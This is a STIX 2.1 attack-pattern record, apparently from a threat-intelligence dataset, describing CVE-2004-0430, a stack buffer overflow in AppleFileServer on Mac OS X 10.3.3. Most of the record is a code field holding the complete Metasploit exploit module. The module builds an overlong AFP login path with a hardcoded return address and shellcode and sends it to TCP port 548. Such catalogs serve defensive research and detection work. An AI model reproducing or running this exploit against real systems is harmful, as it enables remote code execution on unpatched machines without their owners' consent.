{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bfee1f6b-fbb0-46a0-8a2a-89682bd9cb9e",
    "created": "2024-08-14T16:34:35.62353Z",
    "modified": "2024-08-14T16:34:35.623535Z",
    "name": "AppleFileServer LoginExt PathName Overflow",
    "description": " This module exploits a stack buffer overflow in the AppleFileServer service on MacOS X. This vulnerability was originally reported by Atstake and was actually one of the few useful advisories ever published by that company. You only have one chance to exploit this bug. This particular exploit uses a stack-based return address that will only work under optimal conditions. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/afp/loginext.rb",
            "external_id": "loginext.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0430"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AppleFileServer LoginExt PathName Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the AppleFileServer service\n        on MacOS X. This vulnerability was originally reported by Atstake and\n        was actually one of the few useful advisories ever published by that\n        company. You only have one chance to exploit this bug.\n        This particular exploit uses a stack-based return address that will\n        only work under optimal conditions.\n      },\n      'Author'         => 'hdm',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-0430'],\n          [ 'OSVDB', '5762'],\n          [ 'BID', '10271'],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 512,\n          'BadChars' => \"\\x00\\x20\",\n          'MinNops'  => 128,\n          'Compat'   =>\n            {\n              'ConnectionType' => \"+find\"\n            }\n        },\n      'Platform'       => %w{ osx },\n      'Targets'        =>\n        [\n          # Target 0\n          [\n            'Mac OS X 10.3.3',\n            {\n              'Platform' => 'osx',\n              'Arch'     => ARCH_PPC,\n              'Ret'      => 0xf0101c0c # stack address :<\n            },\n          ],\n        ],\n      'DisclosureDate' => '2004-05-03'))\n\n    # Configure the default port to be AFP\n    register_options(\n      [\n        Opt::RPORT(548),\n      ])\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Trying target #{target.name}...\")\n\n    path          = \"\\xff\" * 1024\n    path[168, 4]  = Rex::Arch.pack_addr(target.arch, target.ret)\n    path[172, payload.encoded.length] = payload.encoded\n\n    # The AFP header\n    afp = \"\\x3f\\x00\\x00\\x00\"\n\n    # Add the authentication methods\n    [\"AFP3.1\", \"Cleartxt Passwrd\"].each { |m|\n      afp << [m.length].pack('C') + m\n    }\n\n    # Add the user type and afp path\n    afp << \"\\x03\" + [9].pack('n') + rand_text_alphanumeric(9)\n    afp << \"\\x03\" + [path.length].pack('n') + path\n\n    # Add the data stream interface header\n    dsi =\n    [\n      0,           # Flags\n      2,           # Command\n      rand(65536), # XID\n      0,           # Data Offset\n      afp.length,  # Data Length\n      0            # Reserved\n    ].pack(\"CCnNNN\") + afp\n\n    sock.put(dsi)\n\n    handler\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-05-03",
    "x_mitre_platforms": [
        "osx'"
    ]
}